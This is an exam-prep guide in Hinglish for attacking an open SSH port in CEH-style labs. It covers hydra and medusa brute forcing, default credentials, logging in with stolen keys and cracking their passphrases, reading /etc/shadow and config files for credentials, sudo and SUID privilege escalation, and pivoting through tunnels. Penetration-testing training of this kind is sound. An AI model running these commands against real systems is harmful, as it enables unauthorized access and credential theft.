# SSH PORT OPEN MILA (22) — Ab Kya Karu?

---

## Pehle Samjho: SSH Kya Hai?

SSH (Secure Shell) ek **encrypted protocol** hai jo remote machines pe **command-line access** deta hai. Ye basically tum apni machine se doosri machine pe securely login karte ho — jaise us machine ke saamne baith ke kaam kar rahe ho.

Jab nmap mein port **22** open dikhta hai, toh samjho:

- Target machine pe **remote login** possible hai (agar creds ya key mil jaaye)
- **Password-based login** ya **key-based login** dono ho sakte hain
- Brute force se password crack ho sakta hai (agar lockout policy weak hai)
- Kisi aur service se mili credentials yahaan kaam aa sakti hain (**credential reuse** bahut common hai!)
- Login ke baad tum poora system explore kar sakte ho — flags, files, privilege escalation sab

**FTP vs SSH:** FTP sirf files transfer karta hai, SSH tumhe poora **shell access** deta hai — commands run kar sakte ho, files padh sakte ho, system control kar sakte ho.

**CEH Exam mein SSH:** Mostly direct exploit nahi hota SSH ka. Approach hota hai — kisi aur jagah se creds dhundo (FTP, SMB, Web) aur SSH pe login karo. Ya phir brute force karo. Ya SSH key mil jaaye toh usse login karo.

---

## Step 1: Nmap Se SSH Version Confirm Karo

```bash
nmap -sV -sC -p 22 <TARGET_IP>
```

Output mein ye dekhna hai:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
| ssh-hostkey:
|   2048 SHA256:... (RSA)
|_  256 SHA256:... (ECDSA)
```

**Kya dhyan dena hai:**
- **OpenSSH version** — bahut purani version ho toh exploit mil sakta hai (rare)
- **OS info** — "Ubuntu", "Debian" se pata chalta hai Linux hai
- SSH key fingerprints — mostly exam mein kaam nahi aata

---

## Step 2: Default / Known Credentials Try Karo (PEHLE YEH)

Bahut saari practice labs mein default passwords hote hain. Ye manually try karo:

```bash
ssh msfadmin@<TARGET_IP>       # Metasploitable: msfadmin / msfadmin
ssh root@<TARGET_IP>           # Try: root / toor
ssh root@<TARGET_IP>           # Try: root / root
ssh admin@<TARGET_IP>          # Try: admin / admin
ssh admin@<TARGET_IP>          # Try: admin / password
ssh user@<TARGET_IP>           # Try: user / user
ssh test@<TARGET_IP>           # Try: test / test
```

**Jab password maange** toh type karo — screen pe dikhega nahi (ye normal hai, SSH password hide karta hai).

**Kya hoga:**
- `Welcome to Ubuntu...` ya shell prompt (`$` ya `#`) → **Login successful!** Step 6 pe jao
- `Permission denied` → Password galat hai, Step 3 ya 4 pe jao
- `Connection refused` → SSH service band hai ya firewall block kar raha
- `Connection timed out` → IP galat hai ya machine off hai

---

## Step 3: Brute Force SSH (Agar Default Creds Nahi Chale)

### Hydra Se (Most Common Method):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh -t 4
```

**Command samjho:**
- `-l root` → username fix kiya "root" (lowercase L = single user)
- `-L users.txt` → multiple users try karne hain toh uppercase L with file
- `-P rockyou.txt` → password wordlist (uppercase P = file)
- `-t 4` → **BAHUT IMPORTANT!** SSH zyada parallel connections handle nahi karta. 4 se zyada mat rakho nahi toh connection drop hoga ya account lock ho jayega
- `ssh` → protocol specify kiya

**Multiple users ke saath:**
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh -t 4
```

**Users kahan se laayenge?**
- `enum4linux -U <IP>` (SMB se users list)
- `smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>` (SMTP se)
- FTP pe `/etc/passwd` mila toh usme se usernames nikalo
- Web application se user enumeration
- Common list banao: `root`, `admin`, `user`, `test`, `ftp`, `www-data`, target hostname

**Hydra output kaise padhein:**
```
[22][ssh] host: 10.10.10.5   login: admin   password: monkey123
```
Ye matlab "admin" user ka password "monkey123" hai. Ab login karo!

### Medusa Se (Alternative):
```bash
medusa -h <TARGET_IP> -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

### Ncrack Se (Another Alternative):
```bash
ncrack -vv -u root -P /usr/share/wordlists/rockyou.txt <TARGET_IP>:22
```

---

## Step 4: SSH Key Based Login (Agar Key Mil Gayi)

Bahut common scenario hai — tumhe kisi aur service se (FTP, SMB, Web) ek **private key file** (`id_rsa`) milti hai. Ye SSH login ke liye use hoti hai bina password ke.

### Key kahan milti hai usually:
- FTP anonymous login se: `/home/user/.ssh/id_rsa`
- SMB share mein: `id_rsa` ya `ssh_key` file
- Web directory enumeration mein: `/.ssh/id_rsa`, `/backup/id_rsa`
- LFI vulnerability se: `/home/user/.ssh/id_rsa`

### Key se login kaise karo:

**Step A: Key ki permissions fix karo (ZAROORI HAI):**
```bash
chmod 600 id_rsa
```
Agar ye nahi kiya toh SSH error dega: `Permissions 0644 for 'id_rsa' are too open` — ye common mistake hai!

**Step B: Login karo:**
```bash
ssh -i id_rsa user@<TARGET_IP>
```

**Kya hoga:**
- Direct login ho gaya → Step 6 pe jao
- `Enter passphrase for key` → Key password-protected hai, Step 5 pe jao
- `Permission denied (publickey)` → Username galat hai, try karo: `root`, `admin`, hostname, FTP se mile usernames

### Username kaise dhundo key ke liye:
```bash
# Key file ke andar dekho — kabhi kabhi end mein username likha hota hai:
cat id_rsa.pub    # agar public key bhi mili toh
# Output: ssh-rsa AAAAB3... user@hostname
# "user@hostname" wala part username hai!
```

---

## Step 5: SSH Key Ka Passphrase Crack Karo

Agar key password-protected hai (passphrase maang raha hai login karte waqt):

**Step A: Key ko John-friendly format mein convert karo:**
```bash
ssh2john id_rsa > ssh_hash.txt
```

Ya agar `ssh2john` direct nahi chala:
```bash
python3 /usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
```

**Step B: John the Ripper se crack karo:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

**Step C: Cracked password dekho:**
```bash
john --show ssh_hash.txt
```

Output mein passphrase dikhega. Ab wahi passphrase use karo jab SSH login pe "Enter passphrase" maange:
```bash
ssh -i id_rsa user@<TARGET_IP>
# Enter passphrase: <cracked_passphrase>
```

---

## Step 6: Post-Exploit — SSH Login Ho Gaya, Ab Kya?

Login hone ke baad ye commands systematic order mein chalao:

### Basic Information Gathering:
```bash
whoami                         # kaun ho tum? root ya normal user?
id                             # user ID, groups check karo
hostname                       # machine ka naam
uname -a                       # OS version, kernel version
cat /etc/os-release            # exact OS name aur version
ip addr                        # network interfaces aur IPs
```

### Flag Dhundo (Exam Mein Ye Zaroori Hai!):
```bash
find / -name "flag*" 2>/dev/null           # poore system mein flag dhundo
find / -name "proof*" 2>/dev/null          # "proof.txt" bhi common naam hai
find / -name "secret*" 2>/dev/null
cat /root/flag.txt                          # root ke desktop pe usually
cat /home/*/flag.txt                        # har user ke home mein
ls -la /root/                               # root directory mein dekho
ls -la /home/                               # saare users ke home
ls -la /tmp/                                # temp directory mein bhi
cat /opt/flag.txt                           # /opt mein bhi check karo
```

### Sensitive Files Padho:
```bash
cat /etc/passwd                # saare users ki list (always readable)
cat /etc/shadow                # password hashes (sirf root padh sakta hai)
cat /etc/sudoers               # kaun sudo kar sakta hai
sudo -l                        # TUMHARE user ke sudo permissions
history                        # previous commands — passwords dikh sakte hain!
cat ~/.bash_history            # bash history file
```

### Privilege Escalation Check (Agar Root Nahi Ho):
```bash
sudo -l                        # kya sudo se kuch run kar sakte ho?
# Agar "(ALL) NOPASSWD: ALL" dikhe toh:
sudo su                        # root ban jao!
sudo bash                      # root shell

# SUID binaries check:
find / -perm -4000 2>/dev/null
# Agar /usr/bin/python, /usr/bin/vim, /usr/bin/find SUID hai toh GTFOBins dekho
```

### Credentials Dhundo (Doosri Services Ke Liye):
```bash
cat /var/www/html/config.php           # web app ka config
cat /var/www/html/wp-config.php        # WordPress credentials
cat /etc/mysql/my.cnf                  # MySQL config
cat ~/.ssh/id_rsa                      # aur SSH keys
ls -la /home/*/.ssh/                   # doosre users ki keys
cat /home/*/.bash_history              # doosre users ki history
```

---

## Step 7: SSH Version — Known Exploits (Rare But Check)

```bash
nmap -sV -p 22 <TARGET_IP>
searchsploit openssh <version>
```

**Reality:** SSH direct exploit bahut rare hai CEH exam mein. Mostly approach ye hota hai:
1. Kisi aur service se creds nikalo
2. SSH pe login karo
3. Post-exploit karo

But agar bahut purani version ho (OpenSSH < 7.0) toh `searchsploit` check karo:
```bash
searchsploit openssh 6.6
searchsploit openssh 5.3
```

---

## Step 8: Credential Reuse (BAHUT IMPORTANT!)

Ye CEH exam ka **sabse common pattern** hai — ek service se creds milte hain aur doosri service pe kaam karte hain:

**Kisi aur service se creds mile? SSH pe try karo:**
```bash
# MySQL se mila: dbadmin / password123
ssh dbadmin@<TARGET_IP>

# FTP se mila: ftpuser / letmein
ssh ftpuser@<TARGET_IP>

# Web app se mila: admin / admin@123
ssh admin@<TARGET_IP>

# SMB se mila: john / john2024
ssh john@<TARGET_IP>
```

**SSH se creds mile? Doosri services pe try karo:**
```bash
# /var/www/html/config.php mein MySQL creds mile:
mysql -h <TARGET_IP> -u root -p'dbpassword'

# /etc/shadow se hash mila:
john --wordlist=rockyou.txt shadow_hash.txt
# Cracked password RDP/SMB pe try karo
```

---

## Step 9: SSH Tunneling / Port Forwarding (Advanced)

Agar exam mein internal network access karna ho toh SSH tunnel use hota hai:

### Local Port Forwarding:
```bash
ssh -L 8080:127.0.0.1:80 user@<TARGET_IP>
# Ab APNE browser mein localhost:8080 kholo
# Ye target ke internal port 80 ko tumhare machine pe 8080 pe laa dega
```

**Use case:** Target pe internal web server chal raha hai jo bahar se accessible nahi — SSH tunnel se access karo.

### Dynamic SOCKS Proxy:
```bash
ssh -D 9050 user@<TARGET_IP>
# Ab proxychains use karo apne tools ke saath:
proxychains nmap -sT <INTERNAL_IP>
```

**CEH Exam mein:** Rare hai but agar question mein "pivot" ya "internal network" aaye toh ye kaam aayega.

---

## Common Mistakes (Mat Karna Ye):

1. **`chmod 600` bhool gaye SSH key pe** — SSH "permissions too open" error dega aur login nahi hoga. Hamesha `chmod 600 id_rsa` karo!
2. **Hydra mein `-t 4` nahi diya** — SSH zyada threads handle nahi karta, connections drop honge ya account lockout hoga
3. **Default creds try nahi kiye** — `msfadmin:msfadmin`, `root:toor` pehle manually try karo, 2 second ka kaam hai
4. **Post-exploit mein `sudo -l` bhool gaye** — ye sabse important command hai! Agar sudo access hai toh seedha root ban sakte ho
5. **`find / -name "flag*"` mein `2>/dev/null` nahi diya** — error messages se output padhna mushkil ho jayega
6. **Credential reuse nahi kiya** — agar kisi service se creds mile toh HAMESHA SSH pe try karo
7. **SSH key mili but username galat** — `id_rsa.pub` file mein end pe username hota hai, check karo
8. **History check nahi ki** — `history` aur `~/.bash_history` mein previous commands mein passwords hote hain
9. **Sirf `/root/` mein flag dhunda** — `/home/*/`, `/tmp/`, `/opt/`, `/var/` mein bhi check karo

---

## Quick Decision Tree:

```
SSH open (port 22)
  |
  ├─ nmap -sV -p 22 <IP> (VERSION check)
  |
  ├─ Default creds try karo (PEHLE YEH)
  |   ├─ msfadmin:msfadmin, root:toor, admin:admin
  |   ├─ LOGIN HUA → Post-Exploit (whoami, sudo -l, find flag)
  |   └─ NAHI HUA → aage badho
  |
  ├─ Kisi aur service se creds mile? (FTP/SMB/Web/MySQL)
  |   ├─ HAAN → ssh user@IP with those creds → Login → Post-Exploit
  |   └─ NAHI → Brute Force
  |
  ├─ SSH Key mili? (FTP/SMB/Web se id_rsa)
  |   ├─ chmod 600 id_rsa
  |   ├─ ssh -i id_rsa user@IP
  |   ├─ Passphrase maanga? → ssh2john → john → crack → login
  |   └─ Username nahi pata? → id_rsa.pub check / common names try
  |
  ├─ Brute Force: hydra -l user -P rockyou.txt <IP> ssh -t 4
  |   ├─ Creds mile → Login → Post-Exploit
  |   └─ Nahi mile → doosri services pe focus
  |
  └─ Login hua → POST-EXPLOIT:
      ├─ whoami / id / hostname
      ├─ sudo -l (ROOT banne ka shortcut!)
      ├─ find / -name "flag*" 2>/dev/null
      ├─ cat /etc/passwd, /etc/shadow
      ├─ history (passwords dhundo)
      └─ Creds dhundo → doosri services pe reuse
```
